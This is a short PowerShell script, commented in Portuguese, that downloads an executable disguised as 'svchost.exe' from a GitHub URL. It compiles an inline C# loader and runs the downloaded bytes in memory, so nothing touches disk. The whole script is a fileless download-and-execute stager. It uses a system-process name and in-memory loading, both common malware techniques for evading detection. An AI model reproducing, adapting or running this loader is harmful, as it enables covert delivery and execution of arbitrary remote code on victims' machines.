# 1. URL para o seu .exe hospedado
$url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"

# 2. Baixa o .exe como um array de bytes
$webClient = New-Object System.Net.WebClient
$bytesDoExe = $webClient.DownloadData($url )

# --- NOVA TÉCNICA DE CARREGAMENTO ---
$codigoLoader = @"
using System;
using System.Reflection;
using System.Threading;

public class Loader
{
    [STAThread]
    public static void Executar(byte[] assemblyBytes)
    {
        AppDomain novoDominio = AppDomain.CreateDomain("DominioWPF");
        novoDominio.ExecuteAssembly(assemblyBytes);
    }
}
"@

Add-Type -TypeDefinition $codigoLoader -Language CSharp
[Loader]::Executar($bytesDoExe)
